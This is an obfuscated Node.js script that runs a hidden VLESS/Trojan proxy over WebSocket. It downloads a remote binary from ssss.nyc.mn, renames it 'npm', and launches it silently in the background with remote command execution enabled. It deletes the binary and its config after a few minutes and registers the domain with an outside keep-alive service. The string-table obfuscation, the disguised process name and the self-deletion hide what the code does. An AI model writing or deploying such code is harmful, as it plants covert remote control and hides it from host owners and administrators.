function _0x2e0f(){const _0x10b117=['&fp=chrome&type=ws&host=','hex','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','AUTO_ACCESS','message','buffer','post','Answer','https://dns.google/resolve?name=','&type=A','https://oooo.serv00.net/add-url','\x20with\x20all\x20DNS\x20servers','update','error:\x20','DOMAIN','unlink','finish','error','2096','then','connect','5245qnVcpS','&path=%2F','text/plain','arch','env','url','replace','concat','text/html','20hdEWRP','1.1.1.1','npm\x20download\x20successfully','find','trim','map','client_secret:\x20','9449870oulRKD',':443?security=tls&sni=','1119545FSFqrX','config.yaml','join','sha224','https://arm64.ssss.nyc.mn/v1','substr','--tls','readUInt16BE','index.html','1111041fIwZpO','WSPATH','https://api.ip.sb/geoip','axios','Automatic\x20Access\x20Task\x20added\x20successfully','stream','chmod\x20+x\x20npm','npm\x20running\x20error:','Status','aarch64','readUInt8','application/json','includes','from','Hello\x20world!','application/dns-json',':443?encryption=none&security=tls&sni=','253000oIjMMP','SUB_PATH','http','slice','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','writeHead','Unknown','npm','close','sub','Failed\x20to\x20resolve\x20','log','toString','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2052hWrJgK','8JZwTAe','reduce','readFile','trojan://','data','Server\x20is\x20running\x20on\x20port\x20','writeFileSync','2087','base64','270681FRnQDO','crypto','country_code','false','length','443','listen','path','NAME','\x20-p\x20','catch','get','net','1234.abc.com','/bin/bash','ea1c3a21-87d8-4432-9c84-8f4a824bc9b8','pipe','arm','end','Not\x20Found\x0a','UUID','https://amd64.ssss.nyc.mn/agent','299950FuAoUh','decode','every','pop','8443','test','2053','arm64','once','2083','write','NEZHA_KEY','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running'];_0x2e0f=function(){return _0x10b117;};return _0x2e0f();}const _0x45902d=_0x27e7;(function(_0x2465d7,_0xf39bba){const _0x5dc5b2=_0x27e7,_0x2276d0=_0x2465d7();while(!![]){try{const _0x4bd555=parseInt(_0x5dc5b2(0x127))/0x1+-parseInt(_0x5dc5b2(0x156))/0x2+parseInt(_0x5dc5b2(0x140))/0x3*(-parseInt(_0x5dc5b2(0x104))/0x4)+parseInt(_0x5dc5b2(0xfb))/0x5*(-parseInt(_0x5dc5b2(0x136))/0x6)+parseInt(_0x5dc5b2(0x10d))/0x7+-parseInt(_0x5dc5b2(0x137))/0x8*(-parseInt(_0x5dc5b2(0x116))/0x9)+parseInt(_0x5dc5b2(0x10b))/0xa;if(_0x4bd555===_0xf39bba)break;else _0x2276d0['push'](_0x2276d0['shift']());}catch(_0x2523ea){_0x2276d0['push'](_0x2276d0['shift']());}}}(_0x2e0f,0x7f51f));const os=require('os'),http=require(_0x45902d(0x129)),fs=require('fs'),axios=require(_0x45902d(0x119)),net=require(_0x45902d(0x14c)),path=require(_0x45902d(0x147)),crypto=require(_0x45902d(0x141)),{Buffer}=require(_0x45902d(0xeb)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x45902d(0xff)][_0x45902d(0x154)]||_0x45902d(0x14f),NEZHA_SERVER=process[_0x45902d(0xff)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x45902d(0xff)][_0x45902d(0xe4)]||'',DOMAIN=process['env'][_0x45902d(0xf4)]||_0x45902d(0x14d),AUTO_ACCESS=process['env'][_0x45902d(0xe9)]||!![],WSPATH=process[_0x45902d(0xff)][_0x45902d(0x117)]||UUID[_0x45902d(0x12a)](0x0,0x8),SUB_PATH=process[_0x45902d(0xff)][_0x45902d(0x128)]||_0x45902d(0x131),NAME=process[_0x45902d(0xff)][_0x45902d(0x148)]||'',PORT=process[_0x45902d(0xff)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x40f751=_0x45902d;try{const _0x1bcbad=await axios[_0x40f751(0x14b)](_0x40f751(0x118)),_0x3e4c84=_0x1bcbad[_0x40f751(0x13b)];ISP=(_0x3e4c84[_0x40f751(0x142)]+'-'+_0x3e4c84['isp'])['replace'](/ /g,'_');}catch(_0x332107){ISP=_0x40f751(0x12e);}};GetISP();const httpServer=http['createServer']((_0x54082c,_0x2ca4f5)=>{const _0x334764=_0x45902d;if(_0x54082c[_0x334764(0x100)]==='/'){const _0x577219=path[_0x334764(0x10f)](__dirname,_0x334764(0x115));fs[_0x334764(0x139)](_0x577219,'utf8',(_0x345816,_0x35764d)=>{const _0x267f5d=_0x334764;if(_0x345816){_0x2ca4f5[_0x267f5d(0x12d)](0xc8,{'Content-Type':_0x267f5d(0x103)}),_0x2ca4f5[_0x267f5d(0x152)](_0x267f5d(0x124));return;}_0x2ca4f5[_0x267f5d(0x12d)](0xc8,{'Content-Type':_0x267f5d(0x103)}),_0x2ca4f5[_0x267f5d(0x152)](_0x35764d);});return;}else{if(_0x54082c[_0x334764(0x100)]==='/'+SUB_PATH){const _0x365e3e=NAME?NAME+'-'+ISP:ISP,_0x4e523b='vless://'+UUID+'@'+DOMAIN+_0x334764(0x126)+DOMAIN+_0x334764(0xe6)+DOMAIN+_0x334764(0xfc)+WSPATH+'#'+_0x365e3e,_0x16a26a=_0x334764(0x13a)+UUID+'@'+DOMAIN+_0x334764(0x10c)+DOMAIN+_0x334764(0xe6)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x365e3e,_0x33bf43=_0x4e523b+'\x0a'+_0x16a26a,_0x1dc2f1=Buffer[_0x334764(0x123)](_0x33bf43)[_0x334764(0x134)](_0x334764(0x13f));_0x2ca4f5['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x2ca4f5[_0x334764(0x152)](_0x1dc2f1+'\x0a');}else _0x2ca4f5[_0x334764(0x12d)](0x194,{'Content-Type':_0x334764(0xfd)}),_0x2ca4f5[_0x334764(0x152)](_0x334764(0x153));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x45902d(0x101)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x45902d(0x105)];function resolveHost(_0x24c3f7){return new Promise((_0x5b3155,_0xfbe2a)=>{const _0x2cd2d8=_0x27e7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2cd2d8(0xde)](_0x24c3f7)){_0x5b3155(_0x24c3f7);return;}let _0x1efb29=0x0;function _0x33aeec(){const _0x96333f=_0x2cd2d8;if(_0x1efb29>=DNS_SERVERS[_0x96333f(0x144)]){_0xfbe2a(new Error(_0x96333f(0x132)+_0x24c3f7+_0x96333f(0xf1)));return;}const _0x472884=DNS_SERVERS[_0x1efb29];_0x1efb29++;const _0x58a0ef=_0x96333f(0xee)+encodeURIComponent(_0x24c3f7)+_0x96333f(0xef);axios['get'](_0x58a0ef,{'timeout':0x1388,'headers':{'Accept':_0x96333f(0x125)}})['then'](_0x1fe88d=>{const _0x1769b3=_0x96333f,_0x325349=_0x1fe88d[_0x1769b3(0x13b)];if(_0x325349[_0x1769b3(0x11e)]===0x0&&_0x325349['Answer']&&_0x325349[_0x1769b3(0xed)][_0x1769b3(0x144)]>0x0){const _0x3ad130=_0x325349[_0x1769b3(0xed)][_0x1769b3(0x107)](_0x35c089=>_0x35c089['type']===0x1);if(_0x3ad130){_0x5b3155(_0x3ad130[_0x1769b3(0x13b)]);return;}}_0x33aeec();})['catch'](_0x83a51d=>{_0x33aeec();});}_0x33aeec();});}function handleVlessConnection(_0x41b987,_0x7f31ca){const _0x27fa0c=_0x45902d,[_0x1f3136]=_0x7f31ca,_0xdcea24=_0x7f31ca[_0x27fa0c(0x12a)](0x1,0x11);if(!_0xdcea24[_0x27fa0c(0xdb)]((_0x3c9972,_0x39f357)=>_0x3c9972==parseInt(uuid['substr'](_0x39f357*0x2,0x2),0x10)))return![];let _0x5d2ab5=_0x7f31ca[_0x27fa0c(0x12a)](0x11,0x12)['readUInt8']()+0x13;const _0x298789=_0x7f31ca[_0x27fa0c(0x12a)](_0x5d2ab5,_0x5d2ab5+=0x2)[_0x27fa0c(0x114)](0x0),_0x55730c=_0x7f31ca[_0x27fa0c(0x12a)](_0x5d2ab5,_0x5d2ab5+=0x1)[_0x27fa0c(0x120)](),_0x25bbda=_0x55730c==0x1?_0x7f31ca[_0x27fa0c(0x12a)](_0x5d2ab5,_0x5d2ab5+=0x4)[_0x27fa0c(0x10f)]('.'):_0x55730c==0x2?new TextDecoder()[_0x27fa0c(0x157)](_0x7f31ca[_0x27fa0c(0x12a)](_0x5d2ab5+0x1,_0x5d2ab5+=0x1+_0x7f31ca[_0x27fa0c(0x12a)](_0x5d2ab5,_0x5d2ab5+0x1)[_0x27fa0c(0x120)]())):_0x55730c==0x3?_0x7f31ca['slice'](_0x5d2ab5,_0x5d2ab5+=0x10)[_0x27fa0c(0x138)]((_0x4caae8,_0x3e7cdb,_0x2cac9b,_0x5a02ee)=>_0x2cac9b%0x2?_0x4caae8[_0x27fa0c(0x102)](_0x5a02ee[_0x27fa0c(0x12a)](_0x2cac9b-0x1,_0x2cac9b+0x1)):_0x4caae8,[])['map'](_0x5dbc58=>_0x5dbc58[_0x27fa0c(0x114)](0x0)['toString'](0x10))[_0x27fa0c(0x10f)](':'):'';_0x41b987['send'](new Uint8Array([_0x1f3136,0x0]));const _0xa91238=createWebSocketStream(_0x41b987);return resolveHost(_0x25bbda)['then'](_0x43f1dd=>{const _0x3e9c05=_0x27fa0c;net[_0x3e9c05(0xfa)]({'host':_0x43f1dd,'port':_0x298789},function(){const _0x49e967=_0x3e9c05;this[_0x49e967(0xe3)](_0x7f31ca[_0x49e967(0x12a)](_0x5d2ab5)),_0xa91238['on'](_0x49e967(0xf7),()=>{})[_0x49e967(0x150)](this)['on'](_0x49e967(0xf7),()=>{})['pipe'](_0xa91238);})['on']('error',()=>{});})[_0x27fa0c(0x14a)](_0x40b08e=>{const _0x4021ef=_0x27fa0c;net[_0x4021ef(0xfa)]({'host':_0x25bbda,'port':_0x298789},function(){const _0x2ccd1f=_0x4021ef;this['write'](_0x7f31ca['slice'](_0x5d2ab5)),_0xa91238['on']('error',()=>{})[_0x2ccd1f(0x150)](this)['on'](_0x2ccd1f(0xf7),()=>{})[_0x2ccd1f(0x150)](_0xa91238);})['on'](_0x4021ef(0xf7),()=>{});}),!![];}function handleTrojanConnection(_0x2d3e99,_0x4c0d8c){const _0x31f8f2=_0x45902d;try{if(_0x4c0d8c[_0x31f8f2(0x144)]<0x3a)return![];const _0x5217ac=_0x4c0d8c['slice'](0x0,0x38)[_0x31f8f2(0x134)](),_0x1761b2=[UUID];let _0x4091c0=null;for(const _0x5e661e of _0x1761b2){const _0x274674=crypto['createHash'](_0x31f8f2(0x110))[_0x31f8f2(0xf2)](_0x5e661e)['digest'](_0x31f8f2(0xe7));if(_0x274674===_0x5217ac){_0x4091c0=_0x5e661e;break;}}if(!_0x4091c0)return![];let _0x123788=0x38;_0x4c0d8c[_0x123788]===0xd&&_0x4c0d8c[_0x123788+0x1]===0xa&&(_0x123788+=0x2);const _0x5dc28e=_0x4c0d8c[_0x123788];if(_0x5dc28e!==0x1)return![];_0x123788+=0x1;const _0x33c758=_0x4c0d8c[_0x123788];_0x123788+=0x1;let _0x935b06,_0x2969b0;if(_0x33c758===0x1)_0x935b06=_0x4c0d8c['slice'](_0x123788,_0x123788+0x4)[_0x31f8f2(0x10f)]('.'),_0x123788+=0x4;else{if(_0x33c758===0x3){const _0x5123e6=_0x4c0d8c[_0x123788];_0x123788+=0x1,_0x935b06=_0x4c0d8c[_0x31f8f2(0x12a)](_0x123788,_0x123788+_0x5123e6)[_0x31f8f2(0x134)](),_0x123788+=_0x5123e6;}else{if(_0x33c758===0x4)_0x935b06=_0x4c0d8c[_0x31f8f2(0x12a)](_0x123788,_0x123788+0x10)[_0x31f8f2(0x138)]((_0x156223,_0x570312,_0x149afc,_0x18fcdb)=>_0x149afc%0x2?_0x156223['concat'](_0x18fcdb[_0x31f8f2(0x12a)](_0x149afc-0x1,_0x149afc+0x1)):_0x156223,[])[_0x31f8f2(0x109)](_0x1ad2c4=>_0x1ad2c4[_0x31f8f2(0x114)](0x0)[_0x31f8f2(0x134)](0x10))['join'](':'),_0x123788+=0x10;else return![];}}_0x2969b0=_0x4c0d8c['readUInt16BE'](_0x123788),_0x123788+=0x2;_0x123788<_0x4c0d8c[_0x31f8f2(0x144)]&&_0x4c0d8c[_0x123788]===0xd&&_0x4c0d8c[_0x123788+0x1]===0xa&&(_0x123788+=0x2);const _0x166bfa=createWebSocketStream(_0x2d3e99);return resolveHost(_0x935b06)[_0x31f8f2(0xf9)](_0x190f31=>{const _0x1fd386=_0x31f8f2;net[_0x1fd386(0xfa)]({'host':_0x190f31,'port':_0x2969b0},function(){const _0x2d6857=_0x1fd386;_0x123788<_0x4c0d8c[_0x2d6857(0x144)]&&this['write'](_0x4c0d8c['slice'](_0x123788)),_0x166bfa['on'](_0x2d6857(0xf7),()=>{})['pipe'](this)['on'](_0x2d6857(0xf7),()=>{})[_0x2d6857(0x150)](_0x166bfa);})['on'](_0x1fd386(0xf7),()=>{});})['catch'](_0x11e383=>{net['connect']({'host':_0x935b06,'port':_0x2969b0},function(){const _0x192de7=_0x27e7;_0x123788<_0x4c0d8c[_0x192de7(0x144)]&&this[_0x192de7(0xe3)](_0x4c0d8c[_0x192de7(0x12a)](_0x123788)),_0x166bfa['on'](_0x192de7(0xf7),()=>{})[_0x192de7(0x150)](this)['on']('error',()=>{})[_0x192de7(0x150)](_0x166bfa);})['on']('error',()=>{});}),!![];}catch(_0x4612ee){return![];}}function _0x27e7(_0xd06554,_0x3b4c2e){_0xd06554=_0xd06554-0xdb;const _0x2e0f25=_0x2e0f();let _0x27e712=_0x2e0f25[_0xd06554];return _0x27e712;}wss['on']('connection',(_0x2193dd,_0x4a3f2c)=>{const _0x3db900=_0x45902d,_0x3515c8=_0x4a3f2c[_0x3db900(0x100)]||'';_0x2193dd[_0x3db900(0xe1)](_0x3db900(0xea),_0x10dafe=>{const _0x15017f=_0x3db900;if(_0x10dafe['length']>0x11&&_0x10dafe[0x0]===0x0){const _0x1c08f3=_0x10dafe[_0x15017f(0x12a)](0x1,0x11),_0x318491=_0x1c08f3[_0x15017f(0xdb)]((_0x51eac6,_0x2e2e33)=>_0x51eac6==parseInt(uuid[_0x15017f(0x112)](_0x2e2e33*0x2,0x2),0x10));if(_0x318491){!handleVlessConnection(_0x2193dd,_0x10dafe)&&_0x2193dd['close']();return;}}!handleTrojanConnection(_0x2193dd,_0x10dafe)&&_0x2193dd[_0x15017f(0x130)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x35f594=_0x45902d,_0x2aaa5e=os[_0x35f594(0xfe)]();return _0x2aaa5e===_0x35f594(0x151)||_0x2aaa5e===_0x35f594(0xe0)||_0x2aaa5e===_0x35f594(0x11f)?!NEZHA_PORT?_0x35f594(0x111):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x35f594(0x155);},downloadFile=async()=>{const _0x21f0c6=_0x45902d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1f83f1=getDownloadUrl(),_0x318c96=await axios({'method':_0x21f0c6(0x14b),'url':_0x1f83f1,'responseType':_0x21f0c6(0x11b)}),_0x27a74c=fs['createWriteStream'](_0x21f0c6(0x12f));return _0x318c96[_0x21f0c6(0x13b)][_0x21f0c6(0x150)](_0x27a74c),new Promise((_0x10b17b,_0x499a67)=>{const _0x4e6abc=_0x21f0c6;_0x27a74c['on'](_0x4e6abc(0xf6),()=>{const _0x1c0e77=_0x4e6abc;console['log'](_0x1c0e77(0x106)),exec(_0x1c0e77(0x11c),_0x3c6f4c=>{if(_0x3c6f4c)_0x499a67(_0x3c6f4c);_0x10b17b();});}),_0x27a74c['on']('error',_0x499a67);});}catch(_0xfb97fb){throw _0xfb97fb;}},runnz=async()=>{const _0x550c4c=_0x45902d;try{const _0x285482=execSync(_0x550c4c(0x12b),{'encoding':'utf-8'});if(_0x285482[_0x550c4c(0x108)]()!==''){console[_0x550c4c(0x133)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x5a3148){}await downloadFile();let _0x143cbc='',_0x14de6c=[_0x550c4c(0x145),_0x550c4c(0xdd),_0x550c4c(0xf8),_0x550c4c(0x13e),_0x550c4c(0xe2),_0x550c4c(0xdf)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x58f4c7=_0x14de6c[_0x550c4c(0x122)](NEZHA_PORT)?_0x550c4c(0x113):'';_0x143cbc='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x550c4c(0x149)+NEZHA_KEY+'\x20'+_0x58f4c7+_0x550c4c(0x12c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2ca582=NEZHA_SERVER[_0x550c4c(0x122)](':')?NEZHA_SERVER['split'](':')[_0x550c4c(0xdc)]():'',_0x172a93=_0x14de6c[_0x550c4c(0x122)](_0x2ca582)?'true':_0x550c4c(0x143),_0x52ca14=_0x550c4c(0x10a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x550c4c(0xe8)+_0x172a93+_0x550c4c(0x135)+UUID;fs[_0x550c4c(0x13d)](_0x550c4c(0x10e),_0x52ca14);}_0x143cbc='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x550c4c(0x133)](_0x550c4c(0xe5));return;}}try{exec(_0x143cbc,{'shell':_0x550c4c(0x14e)},_0x57975f=>{const _0x5ef9e7=_0x550c4c;if(_0x57975f)console['error'](_0x5ef9e7(0x11d),_0x57975f);else console['log']('npm\x20is\x20running');});}catch(_0x2642e2){console['error'](_0x550c4c(0xf3)+_0x2642e2);}};async function addAccessTask(){const _0x3aaf99=_0x45902d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x49c67a='https://'+DOMAIN;try{const _0x174bc3=await axios[_0x3aaf99(0xec)](_0x3aaf99(0xf0),{'url':_0x49c67a},{'headers':{'Content-Type':_0x3aaf99(0x121)}});console[_0x3aaf99(0x133)](_0x3aaf99(0x11a));}catch(_0x367e59){}}const delFiles=()=>{const _0x39635d=_0x45902d;fs[_0x39635d(0xf5)](_0x39635d(0x12f),()=>{}),fs['unlink'](_0x39635d(0x10e),()=>{});};httpServer[_0x45902d(0x146)](PORT,()=>{const _0x565fe9=_0x45902d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x565fe9(0x133)](_0x565fe9(0x13c)+PORT);});
